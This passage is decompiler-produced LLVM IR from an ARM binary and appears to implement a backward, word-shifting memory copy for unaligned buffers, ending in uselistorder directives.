  %v1_1b53c = inttoptr i32 %v1_1b538 to i32*
  %v2_1b53c = load i32, i32* %v1_1b53c, align 4
  store i32 %v2_1b53c, i32* @r3, align 4
  %v7_1b540 = icmp ult i32 %v0_1b540, 2
  %v2_1b624 = add i32 %v0_1b62c, -12
  %v4_1b624 = sub i32 11, %v0_1b62c
  %v5_1b624 = and i32 %v4_1b624, %v0_1b62c
  %v6_1b624 = icmp slt i32 %v5_1b624, 0
  store i1 %v6_1b624, i1* %cpsr_v.global-to-local, align 1
  %v7_1b624 = icmp slt i32 %v2_1b624, 0
  store i1 %v7_1b624, i1* %cpsr_n.global-to-local, align 1
  %v8_1b624 = icmp eq i32 %v0_1b62c, 12
  store i1 %v8_1b624, i1* %cpsr_z.global-to-local, align 1
  %v5_1b628 = icmp slt i32 %v0_1b62c, 12
  br i1 %v7_1b540, label %dec_label_pc_1b624, label %dec_label_pc_1b548

dec_label_pc_1b548:                               ; preds = %dec_label_pc_1b538
  %v8_1b540 = icmp eq i32 %v0_1b540, 2
  br i1 %v8_1b540, label %dec_label_pc_1b5b8, label %dec_label_pc_1b54c

dec_label_pc_1b54c:                               ; preds = %dec_label_pc_1b548
  br i1 %v5_1b628, label %dec_label_pc_1b598, label %dec_label_pc_1b554

dec_label_pc_1b554:                               ; preds = %dec_label_pc_1b54c
  store i32 %v2_1b624, i32* %r2.global-to-local, align 4
  %v3_1b558 = load i32, i32* @r4, align 4
  store i32 %v3_1b558, i32* %stack_var_-12, align 4
  %v6_1b558 = load i32, i32* @r5, align 4
  %v8_1b558 = inttoptr i32 %v6_1b558 to i8*
  store i8* %v8_1b558, i8** %stack_var_-8, align 4
  %v11_1b558 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b55c

dec_label_pc_1b55c:                               ; preds = %dec_label_pc_1b55c.dec_label_pc_1b55c_crit_edge, %dec_label_pc_1b554
  %v0_1b580 = phi i32 [ %v1_1b580, %dec_label_pc_1b55c.dec_label_pc_1b55c_crit_edge ], [ %v0_1b58018, %dec_label_pc_1b554 ]
  %v0_1b560 = phi i32 [ %v0_1b560.pre, %dec_label_pc_1b55c.dec_label_pc_1b55c_crit_edge ], [ %v1_1b538, %dec_label_pc_1b554 ]
  %v0_1b55c = phi i32 [ %v0_1b55c.pre, %dec_label_pc_1b55c.dec_label_pc_1b55c_crit_edge ], [ %v2_1b53c, %dec_label_pc_1b554 ]
  %v3_1b55c = mul i32 %v0_1b55c, 256
  store i32 %v3_1b55c, i32* %lr.global-to-local, align 4
  %v1_1b560 = add i32 %v0_1b560, -4
  %v2_1b560 = inttoptr i32 %v1_1b560 to i32*
  %v3_1b560 = load i32, i32* %v2_1b560, align 4
  store i32 %v3_1b560, i32* @r3, align 4
  %v4_1b560 = add i32 %v0_1b560, -8
  %v5_1b560 = inttoptr i32 %v4_1b560 to i32*
  %v6_1b560 = load i32, i32* %v5_1b560, align 4
  store i32 %v6_1b560, i32* %r4.global-to-local, align 4
  %v7_1b560 = add i32 %v0_1b560, -12
  %v8_1b560 = inttoptr i32 %v7_1b560 to i32*
  %v9_1b560 = load i32, i32* %v8_1b560, align 4
  store i32 %v9_1b560, i32* %r5.global-to-local, align 4
  %v10_1b560 = add i32 %v0_1b560, -16
  %v11_1b560 = inttoptr i32 %v10_1b560 to i32*
  %v12_1b560 = load i32, i32* %v11_1b560, align 4
  store i32 %v10_1b560, i32* %r1.global-to-local, align 4
  %v4_1b564 = udiv i32 %v12_1b560, 16777216
  %v5_1b564 = or i32 %v4_1b564, %v3_1b55c
  store i32 %v5_1b564, i32* %lr.global-to-local, align 4
  %v3_1b568 = mul i32 %v12_1b560, 256
  %v4_1b56c = udiv i32 %v9_1b560, 16777216
  %v5_1b56c = or i32 %v3_1b568, %v4_1b56c
  store i32 %v5_1b56c, i32* @ip, align 4
  %v3_1b570 = mul i32 %v9_1b560, 256
  %v4_1b574 = udiv i32 %v6_1b560, 16777216
  %v5_1b574 = or i32 %v3_1b570, %v4_1b574
  store i32 %v5_1b574, i32* %r5.global-to-local, align 4
  %v3_1b578 = mul i32 %v6_1b560, 256
  %v4_1b57c = udiv i32 %v3_1b560, 16777216
  %v5_1b57c = or i32 %v3_1b578, %v4_1b57c
  store i32 %v5_1b57c, i32* %r4.global-to-local, align 4
  %v1_1b580 = add i32 %v0_1b580, -16
  %v2_1b580 = inttoptr i32 %v1_1b580 to i32*
  store i32 %v5_1b57c, i32* %v2_1b580, align 4
  %v4_1b580 = add i32 %v0_1b580, -12
  %v5_1b580 = inttoptr i32 %v4_1b580 to i32*
  %v6_1b580 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1b580, i32* %v5_1b580, align 4
  %v7_1b580 = add i32 %v0_1b580, -8
  %v8_1b580 = inttoptr i32 %v7_1b580 to i32*
  %v9_1b580 = load i32, i32* @ip, align 4
  store i32 %v9_1b580, i32* %v8_1b580, align 4
  %v10_1b580 = add i32 %v0_1b580, -4
  %v11_1b580 = inttoptr i32 %v10_1b580 to i32*
  %v12_1b580 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b580, i32* %v11_1b580, align 4
  store i32 %v1_1b580, i32* %r0.global-to-local, align 4
  %v0_1b584 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b584 = add i32 %v0_1b584, -16
  store i32 %v2_1b584, i32* %r2.global-to-local, align 4
  %v6_1b588 = icmp slt i32 %v0_1b584, 16
  br i1 %v6_1b588, label %dec_label_pc_1b58c, label %dec_label_pc_1b55c.dec_label_pc_1b55c_crit_edge

dec_label_pc_1b55c.dec_label_pc_1b55c_crit_edge:  ; preds = %dec_label_pc_1b55c
  %v0_1b55c.pre = load i32, i32* @r3, align 4
  %v0_1b560.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b55c

dec_label_pc_1b58c:                               ; preds = %dec_label_pc_1b55c
  %v2_1b58c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b58c, i32* @r4, align 4
  %v5_1b58c = load i8*, i8** %stack_var_-8, align 4
  %v6_1b58c = ptrtoint i8* %v5_1b58c to i32
  store i32 %v6_1b58c, i32* @r5, align 4
  store i32 %v11_1b558, i32* @lr, align 4
  %v2_1b590 = add i32 %v0_1b584, -4
  store i32 %v2_1b590, i32* %r2.global-to-local, align 4
  %v4_1b590 = add i32 %v0_1b584, 2147483632
  %v5_1b590 = and i32 %v2_1b590, %v4_1b590
  %v6_1b590 = icmp slt i32 %v5_1b590, 0
  store i1 %v6_1b590, i1* %cpsr_v.global-to-local, align 1
  %v7_1b590 = icmp slt i32 %v2_1b590, 0
  store i1 %v7_1b590, i1* %cpsr_n.global-to-local, align 1
  %v8_1b590 = icmp eq i32 %v2_1b590, 0
  store i1 %v8_1b590, i1* %cpsr_z.global-to-local, align 1
  %v5_1b594 = icmp slt i32 %v2_1b584, -12
  br i1 %v5_1b594, label %dec_label_pc_1b5b0, label %dec_label_pc_1b598

dec_label_pc_1b598:                               ; preds = %dec_label_pc_1b58c, %dec_label_pc_1b54c, %dec_label_pc_1b598
  %v1_1b5a4 = phi i32 [ %v5_1b5a4, %dec_label_pc_1b598 ], [ %v1_1b580, %dec_label_pc_1b58c ], [ %v0_1b58018, %dec_label_pc_1b54c ]
  %v0_1b598 = load i32, i32* @r3, align 4
  %v3_1b598 = mul i32 %v0_1b598, 256
  store i32 %v3_1b598, i32* %ip.global-to-local, align 4
  %v0_1b59c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b59c = add i32 %v0_1b59c, -4
  %v2_1b59c = inttoptr i32 %v1_1b59c to i32*
  %v3_1b59c = load i32, i32* %v2_1b59c, align 4
  store i32 %v3_1b59c, i32* @r3, align 4
  store i32 %v1_1b59c, i32* %r1.global-to-local, align 4
  %v4_1b5a0 = udiv i32 %v3_1b59c, 16777216
  %v5_1b5a0 = or i32 %v4_1b5a0, %v3_1b598
  store i32 %v5_1b5a0, i32* @ip, align 4
  %v2_1b5a4 = add i32 %v1_1b5a4, -4
  %v3_1b5a4 = inttoptr i32 %v2_1b5a4 to i32*
  store i32 %v5_1b5a0, i32* %v3_1b5a4, align 4
  %v4_1b5a4 = load i32, i32* %r0.global-to-local, align 4
  %v5_1b5a4 = add i32 %v4_1b5a4, -4
  store i32 %v5_1b5a4, i32* %r0.global-to-local, align 4
  %v0_1b5a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b5a8 = add i32 %v0_1b5a8, -4
  store i32 %v2_1b5a8, i32* %r2.global-to-local, align 4
  %v6_1b5ac = icmp slt i32 %v0_1b5a8, 4
  br i1 %v6_1b5ac, label %dec_label_pc_1b5b0.loopexit, label %dec_label_pc_1b598

dec_label_pc_1b5b0.loopexit:                      ; preds = %dec_label_pc_1b598
  %v4_1b5a8 = sub i32 3, %v0_1b5a8
  %v5_1b5a8 = and i32 %v4_1b5a8, %v0_1b5a8
  %v6_1b5a8 = icmp slt i32 %v5_1b5a8, 0
  %v7_1b5a8 = icmp slt i32 %v2_1b5a8, 0
  store i1 %v6_1b5a8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1b5a8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b5b0

dec_label_pc_1b5b0:                               ; preds = %dec_label_pc_1b5b0.loopexit, %dec_label_pc_1b58c
  %v2_1b4f450 = phi i32 [ %v5_1b5a4, %dec_label_pc_1b5b0.loopexit ], [ %v1_1b580, %dec_label_pc_1b58c ]
  %v0_1b4e446 = phi i32 [ %v2_1b5a8, %dec_label_pc_1b5b0.loopexit ], [ %v2_1b590, %dec_label_pc_1b58c ]
  %v0_1b5b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b5b0 = add i32 %v0_1b5b0, 3
  store i32 %v1_1b5b0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_1b5b8:                               ; preds = %dec_label_pc_1b548
  br i1 %v5_1b628, label %dec_label_pc_1b604, label %dec_label_pc_1b5c0

dec_label_pc_1b5c0:                               ; preds = %dec_label_pc_1b5b8
  store i32 %v2_1b624, i32* %r2.global-to-local, align 4
  %v3_1b5c4 = load i32, i32* @r4, align 4
  store i32 %v3_1b5c4, i32* %stack_var_-12, align 4
  %v6_1b5c4 = load i32, i32* @r5, align 4
  %v8_1b5c4 = inttoptr i32 %v6_1b5c4 to i8*
  store i8* %v8_1b5c4, i8** %stack_var_-8, align 4
  %v11_1b5c4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b5c8

dec_label_pc_1b5c8:                               ; preds = %dec_label_pc_1b5c8.dec_label_pc_1b5c8_crit_edge, %dec_label_pc_1b5c0
  %v0_1b5ec = phi i32 [ %v1_1b5ec, %dec_label_pc_1b5c8.dec_label_pc_1b5c8_crit_edge ], [ %v0_1b58018, %dec_label_pc_1b5c0 ]
  %v0_1b5cc = phi i32 [ %v0_1b5cc.pre, %dec_label_pc_1b5c8.dec_label_pc_1b5c8_crit_edge ], [ %v1_1b538, %dec_label_pc_1b5c0 ]
  %v0_1b5c8 = phi i32 [ %v0_1b5c8.pre, %dec_label_pc_1b5c8.dec_label_pc_1b5c8_crit_edge ], [ %v2_1b53c, %dec_label_pc_1b5c0 ]
  %v3_1b5c8 = mul i32 %v0_1b5c8, 65536
  store i32 %v3_1b5c8, i32* %lr.global-to-local, align 4
  %v1_1b5cc = add i32 %v0_1b5cc, -4
  %v2_1b5cc = inttoptr i32 %v1_1b5cc to i32*
  %v3_1b5cc = load i32, i32* %v2_1b5cc, align 4
  store i32 %v3_1b5cc, i32* @r3, align 4
  %v4_1b5cc = add i32 %v0_1b5cc, -8
  %v5_1b5cc = inttoptr i32 %v4_1b5cc to i32*
  %v6_1b5cc = load i32, i32* %v5_1b5cc, align 4
  store i32 %v6_1b5cc, i32* %r4.global-to-local, align 4
  %v7_1b5cc = add i32 %v0_1b5cc, -12
  %v8_1b5cc = inttoptr i32 %v7_1b5cc to i32*
  %v9_1b5cc = load i32, i32* %v8_1b5cc, align 4
  store i32 %v9_1b5cc, i32* %r5.global-to-local, align 4
  %v10_1b5cc = add i32 %v0_1b5cc, -16
  %v11_1b5cc = inttoptr i32 %v10_1b5cc to i32*
  %v12_1b5cc = load i32, i32* %v11_1b5cc, align 4
  store i32 %v10_1b5cc, i32* %r1.global-to-local, align 4
  %v4_1b5d0 = udiv i32 %v12_1b5cc, 65536
  %v5_1b5d0 = or i32 %v4_1b5d0, %v3_1b5c8
  store i32 %v5_1b5d0, i32* %lr.global-to-local, align 4
  %v3_1b5d4 = mul i32 %v12_1b5cc, 65536
  %v4_1b5d8 = udiv i32 %v9_1b5cc, 65536
  %v5_1b5d8 = or i32 %v3_1b5d4, %v4_1b5d8
  store i32 %v5_1b5d8, i32* @ip, align 4
  %v3_1b5dc = mul i32 %v9_1b5cc, 65536
  %v4_1b5e0 = udiv i32 %v6_1b5cc, 65536
  %v5_1b5e0 = or i32 %v3_1b5dc, %v4_1b5e0
  store i32 %v5_1b5e0, i32* %r5.global-to-local, align 4
  %v3_1b5e4 = mul i32 %v6_1b5cc, 65536
  %v4_1b5e8 = udiv i32 %v3_1b5cc, 65536
  %v5_1b5e8 = or i32 %v3_1b5e4, %v4_1b5e8
  store i32 %v5_1b5e8, i32* %r4.global-to-local, align 4
  %v1_1b5ec = add i32 %v0_1b5ec, -16
  %v2_1b5ec = inttoptr i32 %v1_1b5ec to i32*
  store i32 %v5_1b5e8, i32* %v2_1b5ec, align 4
  %v4_1b5ec = add i32 %v0_1b5ec, -12
  %v5_1b5ec = inttoptr i32 %v4_1b5ec to i32*
  %v6_1b5ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1b5ec, i32* %v5_1b5ec, align 4
  %v7_1b5ec = add i32 %v0_1b5ec, -8
  %v8_1b5ec = inttoptr i32 %v7_1b5ec to i32*
  %v9_1b5ec = load i32, i32* @ip, align 4
  store i32 %v9_1b5ec, i32* %v8_1b5ec, align 4
  %v10_1b5ec = add i32 %v0_1b5ec, -4
  %v11_1b5ec = inttoptr i32 %v10_1b5ec to i32*
  %v12_1b5ec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b5ec, i32* %v11_1b5ec, align 4
  store i32 %v1_1b5ec, i32* %r0.global-to-local, align 4
  %v0_1b5f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b5f0 = add i32 %v0_1b5f0, -16
  store i32 %v2_1b5f0, i32* %r2.global-to-local, align 4
  %v6_1b5f4 = icmp slt i32 %v0_1b5f0, 16
  br i1 %v6_1b5f4, label %dec_label_pc_1b5f8, label %dec_label_pc_1b5c8.dec_label_pc_1b5c8_crit_edge

dec_label_pc_1b5c8.dec_label_pc_1b5c8_crit_edge:  ; preds = %dec_label_pc_1b5c8
  %v0_1b5c8.pre = load i32, i32* @r3, align 4
  %v0_1b5cc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b5c8

dec_label_pc_1b5f8:                               ; preds = %dec_label_pc_1b5c8
  %v2_1b5f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b5f8, i32* @r4, align 4
  %v5_1b5f8 = load i8*, i8** %stack_var_-8, align 4
  %v6_1b5f8 = ptrtoint i8* %v5_1b5f8 to i32
  store i32 %v6_1b5f8, i32* @r5, align 4
  store i32 %v11_1b5c4, i32* @lr, align 4
  %v2_1b5fc = add i32 %v0_1b5f0, -4
  store i32 %v2_1b5fc, i32* %r2.global-to-local, align 4
  %v4_1b5fc = add i32 %v0_1b5f0, 2147483632
  %v5_1b5fc = and i32 %v2_1b5fc, %v4_1b5fc
  %v6_1b5fc = icmp slt i32 %v5_1b5fc, 0
  store i1 %v6_1b5fc, i1* %cpsr_v.global-to-local, align 1
  %v7_1b5fc = icmp slt i32 %v2_1b5fc, 0
  store i1 %v7_1b5fc, i1* %cpsr_n.global-to-local, align 1
  %v8_1b5fc = icmp eq i32 %v2_1b5fc, 0
  store i1 %v8_1b5fc, i1* %cpsr_z.global-to-local, align 1
  %v5_1b600 = icmp slt i32 %v2_1b5f0, -12
  br i1 %v5_1b600, label %dec_label_pc_1b61c, label %dec_label_pc_1b604

dec_label_pc_1b604:                               ; preds = %dec_label_pc_1b5f8, %dec_label_pc_1b5b8, %dec_label_pc_1b604
  %v1_1b610 = phi i32 [ %v5_1b610, %dec_label_pc_1b604 ], [ %v1_1b5ec, %dec_label_pc_1b5f8 ], [ %v0_1b58018, %dec_label_pc_1b5b8 ]
  %v0_1b604 = load i32, i32* @r3, align 4
  %v3_1b604 = mul i32 %v0_1b604, 65536
  store i32 %v3_1b604, i32* %ip.global-to-local, align 4
  %v0_1b608 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b608 = add i32 %v0_1b608, -4
  %v2_1b608 = inttoptr i32 %v1_1b608 to i32*
  %v3_1b608 = load i32, i32* %v2_1b608, align 4
  store i32 %v3_1b608, i32* @r3, align 4
  store i32 %v1_1b608, i32* %r1.global-to-local, align 4
  %v4_1b60c = udiv i32 %v3_1b608, 65536
  %v5_1b60c = or i32 %v4_1b60c, %v3_1b604
  store i32 %v5_1b60c, i32* @ip, align 4
  %v2_1b610 = add i32 %v1_1b610, -4
  %v3_1b610 = inttoptr i32 %v2_1b610 to i32*
  store i32 %v5_1b60c, i32* %v3_1b610, align 4
  %v4_1b610 = load i32, i32* %r0.global-to-local, align 4
  %v5_1b610 = add i32 %v4_1b610, -4
  store i32 %v5_1b610, i32* %r0.global-to-local, align 4
  %v0_1b614 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b614 = add i32 %v0_1b614, -4
  store i32 %v2_1b614, i32* %r2.global-to-local, align 4
  %v6_1b618 = icmp slt i32 %v0_1b614, 4
  br i1 %v6_1b618, label %dec_label_pc_1b61c.loopexit, label %dec_label_pc_1b604

dec_label_pc_1b61c.loopexit:                      ; preds = %dec_label_pc_1b604
  %v4_1b614 = sub i32 3, %v0_1b614
  %v5_1b614 = and i32 %v4_1b614, %v0_1b614
  %v6_1b614 = icmp slt i32 %v5_1b614, 0
  %v7_1b614 = icmp slt i32 %v2_1b614, 0
  store i1 %v6_1b614, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1b614, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b61c

dec_label_pc_1b61c:                               ; preds = %dec_label_pc_1b61c.loopexit, %dec_label_pc_1b5f8
  %v2_1b4f451 = phi i32 [ %v5_1b610, %dec_label_pc_1b61c.loopexit ], [ %v1_1b5ec, %dec_label_pc_1b5f8 ]
  %v0_1b4e447 = phi i32 [ %v2_1b614, %dec_label_pc_1b61c.loopexit ], [ %v2_1b5fc, %dec_label_pc_1b5f8 ]
  %v0_1b61c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b61c = add i32 %v0_1b61c, 2
  store i32 %v1_1b61c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_1b624:                               ; preds = %dec_label_pc_1b538
  br i1 %v5_1b628, label %dec_label_pc_1b670, label %dec_label_pc_1b62c

dec_label_pc_1b62c:                               ; preds = %dec_label_pc_1b624
  store i32 %v2_1b624, i32* %r2.global-to-local, align 4
  %v3_1b630 = load i32, i32* @r4, align 4
  store i32 %v3_1b630, i32* %stack_var_-12, align 4
  %v6_1b630 = load i32, i32* @r5, align 4
  %v8_1b630 = inttoptr i32 %v6_1b630 to i8*
  store i8* %v8_1b630, i8** %stack_var_-8, align 4
  %v11_1b630 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b634

dec_label_pc_1b634:                               ; preds = %dec_label_pc_1b634.dec_label_pc_1b634_crit_edge, %dec_label_pc_1b62c
  %v0_1b658 = phi i32 [ %v1_1b658, %dec_label_pc_1b634.dec_label_pc_1b634_crit_edge ], [ %v0_1b58018, %dec_label_pc_1b62c ]
  %v0_1b638 = phi i32 [ %v0_1b638.pre, %dec_label_pc_1b634.dec_label_pc_1b634_crit_edge ], [ %v1_1b538, %dec_label_pc_1b62c ]
  %v0_1b634 = phi i32 [ %v0_1b634.pre, %dec_label_pc_1b634.dec_label_pc_1b634_crit_edge ], [ %v2_1b53c, %dec_label_pc_1b62c ]
  %v3_1b634 = mul i32 %v0_1b634, 16777216
  store i32 %v3_1b634, i32* %lr.global-to-local, align 4
  %v1_1b638 = add i32 %v0_1b638, -4
  %v2_1b638 = inttoptr i32 %v1_1b638 to i32*
  %v3_1b638 = load i32, i32* %v2_1b638, align 4
  store i32 %v3_1b638, i32* @r3, align 4
  %v4_1b638 = add i32 %v0_1b638, -8
  %v5_1b638 = inttoptr i32 %v4_1b638 to i32*
  %v6_1b638 = load i32, i32* %v5_1b638, align 4
  store i32 %v6_1b638, i32* %r4.global-to-local, align 4
  %v7_1b638 = add i32 %v0_1b638, -12
  %v8_1b638 = inttoptr i32 %v7_1b638 to i32*
  %v9_1b638 = load i32, i32* %v8_1b638, align 4
  store i32 %v9_1b638, i32* %r5.global-to-local, align 4
  %v10_1b638 = add i32 %v0_1b638, -16
  %v11_1b638 = inttoptr i32 %v10_1b638 to i32*
  %v12_1b638 = load i32, i32* %v11_1b638, align 4
  store i32 %v10_1b638, i32* %r1.global-to-local, align 4
  %v4_1b63c = udiv i32 %v12_1b638, 256
  %v5_1b63c = or i32 %v4_1b63c, %v3_1b634
  store i32 %v5_1b63c, i32* %lr.global-to-local, align 4
  %v3_1b640 = mul i32 %v12_1b638, 16777216
  %v4_1b644 = udiv i32 %v9_1b638, 256
  %v5_1b644 = or i32 %v3_1b640, %v4_1b644
  store i32 %v5_1b644, i32* @ip, align 4
  %v3_1b648 = mul i32 %v9_1b638, 16777216
  %v4_1b64c = udiv i32 %v6_1b638, 256
  %v5_1b64c = or i32 %v3_1b648, %v4_1b64c
  store i32 %v5_1b64c, i32* %r5.global-to-local, align 4
  %v3_1b650 = mul i32 %v6_1b638, 16777216
  %v4_1b654 = udiv i32 %v3_1b638, 256
  %v5_1b654 = or i32 %v3_1b650, %v4_1b654
  store i32 %v5_1b654, i32* %r4.global-to-local, align 4
  %v1_1b658 = add i32 %v0_1b658, -16
  %v2_1b658 = inttoptr i32 %v1_1b658 to i32*
  store i32 %v5_1b654, i32* %v2_1b658, align 4
  %v4_1b658 = add i32 %v0_1b658, -12
  %v5_1b658 = inttoptr i32 %v4_1b658 to i32*
  %v6_1b658 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1b658, i32* %v5_1b658, align 4
  %v7_1b658 = add i32 %v0_1b658, -8
  %v8_1b658 = inttoptr i32 %v7_1b658 to i32*
  %v9_1b658 = load i32, i32* @ip, align 4
  store i32 %v9_1b658, i32* %v8_1b658, align 4
  %v10_1b658 = add i32 %v0_1b658, -4
  %v11_1b658 = inttoptr i32 %v10_1b658 to i32*
  %v12_1b658 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b658, i32* %v11_1b658, align 4
  store i32 %v1_1b658, i32* %r0.global-to-local, align 4
  %v0_1b65c = load i32, i32* %r2.global-to-local, align 4
  %v2_1b65c = add i32 %v0_1b65c, -16
  store i32 %v2_1b65c, i32* %r2.global-to-local, align 4
  %v6_1b660 = icmp slt i32 %v0_1b65c, 16
  br i1 %v6_1b660, label %dec_label_pc_1b664, label %dec_label_pc_1b634.dec_label_pc_1b634_crit_edge

dec_label_pc_1b634.dec_label_pc_1b634_crit_edge:  ; preds = %dec_label_pc_1b634
  %v0_1b634.pre = load i32, i32* @r3, align 4
  %v0_1b638.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b634

dec_label_pc_1b664:                               ; preds = %dec_label_pc_1b634
  %v2_1b664 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b664, i32* @r4, align 4
  %v5_1b664 = load i8*, i8** %stack_var_-8, align 4
  %v6_1b664 = ptrtoint i8* %v5_1b664 to i32
  store i32 %v6_1b664, i32* @r5, align 4
  store i32 %v11_1b630, i32* @lr, align 4
  %v2_1b668 = add i32 %v0_1b65c, -4
  store i32 %v2_1b668, i32* %r2.global-to-local, align 4
  %v4_1b668 = add i32 %v0_1b65c, 2147483632
  %v5_1b668 = and i32 %v2_1b668, %v4_1b668
  %v6_1b668 = icmp slt i32 %v5_1b668, 0
  store i1 %v6_1b668, i1* %cpsr_v.global-to-local, align 1
  %v7_1b668 = icmp slt i32 %v2_1b668, 0
  store i1 %v7_1b668, i1* %cpsr_n.global-to-local, align 1
  %v8_1b668 = icmp eq i32 %v2_1b668, 0
  store i1 %v8_1b668, i1* %cpsr_z.global-to-local, align 1
  %v5_1b66c = icmp slt i32 %v2_1b65c, -12
  br i1 %v5_1b66c, label %dec_label_pc_1b688, label %dec_label_pc_1b670

dec_label_pc_1b670:                               ; preds = %dec_label_pc_1b664, %dec_label_pc_1b624, %dec_label_pc_1b670
  %v1_1b67c = phi i32 [ %v5_1b67c, %dec_label_pc_1b670 ], [ %v1_1b658, %dec_label_pc_1b664 ], [ %v0_1b58018, %dec_label_pc_1b624 ]
  %v0_1b670 = load i32, i32* @r3, align 4
  %v3_1b670 = mul i32 %v0_1b670, 16777216
  store i32 %v3_1b670, i32* %ip.global-to-local, align 4
  %v0_1b674 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b674 = add i32 %v0_1b674, -4
  %v2_1b674 = inttoptr i32 %v1_1b674 to i32*
  %v3_1b674 = load i32, i32* %v2_1b674, align 4
  store i32 %v3_1b674, i32* @r3, align 4
  store i32 %v1_1b674, i32* %r1.global-to-local, align 4
  %v4_1b678 = udiv i32 %v3_1b674, 256
  %v5_1b678 = or i32 %v4_1b678, %v3_1b670
  store i32 %v5_1b678, i32* @ip, align 4
  %v2_1b67c = add i32 %v1_1b67c, -4
  %v3_1b67c = inttoptr i32 %v2_1b67c to i32*
  store i32 %v5_1b678, i32* %v3_1b67c, align 4
  %v4_1b67c = load i32, i32* %r0.global-to-local, align 4
  %v5_1b67c = add i32 %v4_1b67c, -4
  store i32 %v5_1b67c, i32* %r0.global-to-local, align 4
  %v0_1b680 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b680 = add i32 %v0_1b680, -4
  store i32 %v2_1b680, i32* %r2.global-to-local, align 4
  %v6_1b684 = icmp slt i32 %v0_1b680, 4
  br i1 %v6_1b684, label %dec_label_pc_1b688.loopexit, label %dec_label_pc_1b670

dec_label_pc_1b688.loopexit:                      ; preds = %dec_label_pc_1b670
  %v4_1b680 = sub i32 3, %v0_1b680
  %v5_1b680 = and i32 %v4_1b680, %v0_1b680
  %v6_1b680 = icmp slt i32 %v5_1b680, 0
  %v7_1b680 = icmp slt i32 %v2_1b680, 0
  store i1 %v6_1b680, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1b680, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b688

dec_label_pc_1b688:                               ; preds = %dec_label_pc_1b688.loopexit, %dec_label_pc_1b664
  %v2_1b4f452 = phi i32 [ %v5_1b67c, %dec_label_pc_1b688.loopexit ], [ %v1_1b658, %dec_label_pc_1b664 ]
  %v0_1b4e448 = phi i32 [ %v2_1b680, %dec_label_pc_1b688.loopexit ], [ %v2_1b668, %dec_label_pc_1b664 ]
  %v0_1b688 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b688 = add i32 %v0_1b688, 1
  store i32 %v1_1b688, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1b67c, { 0, 2, 1 }
  uselistorder i32 %v3_1b670, { 1, 0 }
  uselistorder i32 %v2_1b668, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b658, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1b638, { 1, 0 }
  uselistorder i32 %v3_1b634, { 1, 0 }
  uselistorder i32 %v0_1b638, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b658, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1b610, { 0, 2, 1 }
  uselistorder i32 %v3_1b604, { 1, 0 }
  uselistorder i32 %v2_1b5fc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b5ec, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1b5cc, { 1, 0 }
  uselistorder i32 %v3_1b5c8, { 1, 0 }
  uselistorder i32 %v0_1b5cc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b5ec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1b5a4, { 0, 2, 1 }
  uselistorder i32 %v3_1b598, { 1, 0 }
  uselistorder i32 %v2_1b590, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b580, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1b560, { 1, 0 }
  uselistorder i32 %v3_1b55c, { 1, 0 }
  uselistorder i32 %v0_1b560, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b580, { 3, 2, 1, 0 }
  uselistorder i1 %v5_1b628, { 2, 0, 1 }
  uselistorder i32 %v0_1b540, { 1, 0 }
  uselistorder i32 %v0_1b62c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1b58018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1b530, { 2, 1, 0 }
  uselistorder i32 %v0_1b530, { 2, 0, 1 }
  uselistorder i32 %v2_1b528, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_1b528, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1b528, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1b58019, { 2, 1, 0 }
  uselistorder i32 %v11_1b504, { 1, 0 }
  uselistorder i32 %v7_1b504, { 1, 0 }
  uselistorder i32 %v1_1b4e4, { 0, 1, 3, 4, 2, 5 }
